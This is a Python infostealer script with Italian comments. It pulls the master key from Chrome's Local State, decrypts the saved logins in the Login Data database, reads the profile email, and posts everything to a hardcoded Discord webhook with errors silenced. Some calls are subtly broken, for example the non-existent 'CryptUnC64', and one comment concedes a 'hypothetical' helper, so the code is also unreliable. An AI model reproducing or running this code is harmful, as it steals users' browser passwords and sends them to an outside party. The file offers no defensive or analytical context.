import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pywin32
import requests
from Crypto.Cipher import AES # pip install pycryptodome

# Configurazione Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1569675930224431234/d7q_3nMmRgejnAySBG4R5ARJFmlDOYWWXiukdGLzc6pG4yvJTSQjmSrVzCUWDz9cXUhx"

def get_password():
    # Percorso locale delle password di Chrome
    local_state_path = os.path.join(os.environ["USERPROFILE"], 
        r"AppData\Local\Google\Chrome\User Data\Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # Decriptazione della Master Key
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    decrypted_key = win32crypt.CryptUnC64(encrypted_key[5:], None)[0]

    # Copia del database per evitare errori di "file in use"
    login_py_path = os.path.join(os.environ["USERPROFILE"], 
        r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
    shutil.copyfile(login_py_path, "temp_db")

    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    extracted_data = ""
    for row in cursor.fetchall():
        url = row[0]
        user = row[1]
        encrypted_pass = row[2]
        # Decripta la password usando la Master Key
        decrypted_pass = decrypt_password(encrypted_pass, decrypted_key)
        # Nota: per semplicità qui uso una funzione ipotetica, 
        # in realtà serve un wrapper per AES-GCM
        extracted_data += f"URL: {url} | User: {user} | Pass: {decrypted_pass}\n"

    conn.close()
    os.remove("temp_db")
    return extracted_data

def decrypt_password(encrypted_password, key):
    try:
        # Rimuove il prefisso 'dpapi' se presente
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode() # Rimuove il tag di autenticazione
    except Exception:
        return "Errore Decriptazione"
def send_to_discord(data):
    payload = {"content": f"**Dati Recuperati:**\n```\n{data}```"}
    requests.post(WEBHOOK_URL, json=payload)
def get_email():
    try:
        # Cerca nei file di preferenze di Chrome
        pref_path = os.path.join(os.environ["USERPROFILE"], 
            r"AppData\Local\Google\Chrome\User Data\Default\Preferences")
        with open(pref_path, "r", encoding="utf-8") as f:
            prefs = json.load(f)
            # Estrae la mail del profilo principale
            return prefs.get("account_email", "Mail non trovata")
    except:
        return "Errore nel recupero mail"


if __name__ == "__main__":
    try:
        email = get_email()
        passwords = get_password()
        data_to_send = f"Email: {email}\n\n{passwords}"
        send_to_discord(data_to_send)
    except Exception as e:
        pass